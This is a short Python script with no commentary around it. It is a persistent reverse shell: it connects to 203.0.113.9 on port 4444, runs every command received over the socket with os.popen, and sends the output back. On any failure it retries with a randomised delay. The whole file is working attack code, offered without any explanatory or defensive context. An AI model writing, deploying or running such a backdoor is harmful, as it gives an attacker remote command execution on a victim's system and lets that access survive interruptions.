import socket, os, time, random
def go(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    while True:
        data = s.recv(4096)
        if not data:
            break
        out = os.popen(data.decode().strip()).read()
        s.sendall(out.encode())
while True:
    try:
        go("203.0.113.9", 4444)
    except Exception:
        time.sleep(10 + random.randint(0, 5))
